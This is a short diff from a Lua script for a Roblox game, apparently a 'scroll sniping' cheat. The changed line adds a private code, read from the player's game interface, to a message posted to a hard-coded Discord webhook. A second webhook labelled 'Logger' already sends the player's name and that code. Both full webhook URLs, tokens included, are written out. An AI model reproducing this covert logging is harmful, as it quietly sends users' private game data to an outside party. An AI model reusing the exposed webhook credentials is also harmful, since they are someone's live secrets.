@@ -232,7 +232,7 @@ function SendMessage(Webhook, Message, Botname)
     return Data or nil;
 end
 local monkeyzzz = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").private.Text
-        SendMessage("https://discordapp.com/api/webhooks/766777831694270473/h-nHwLJqqybqMCMamh_QBaHMJYBX2PpwJCO1F5ia8bLGwUENlAi4gPdoxcrOXlgt4HT_", "***".. " SNIPED: "  ..  v.Name .. "***", "Senpai And Hentai Winning")
+        SendMessage("https://discordapp.com/api/webhooks/766777831694270473/h-nHwLJqqybqMCMamh_QBaHMJYBX2PpwJCO1F5ia8bLGwUENlAi4gPdoxcrOXlgt4HT_", "***".. " SNIPED: "  ..   v.Name  ..  monkeyzzz  .. "***", "Senpai And Hentai Winning")
        SendMessage("https://discordapp.com/api/webhooks/766006562380054528/oOWi34rOjuqYi4mi86ZssDCUXfZXMoJsRX-FHYwNjDUJf9iABLbvbPf2Q6OfYDR158SA", "***" .. name .. " sniped ".. v.Name .. "Code: "  .. monkeyzzz .. "***", "Logger")
        game.StarterGui:SetCore("SendNotification", {
 Title = "scroll sniped";
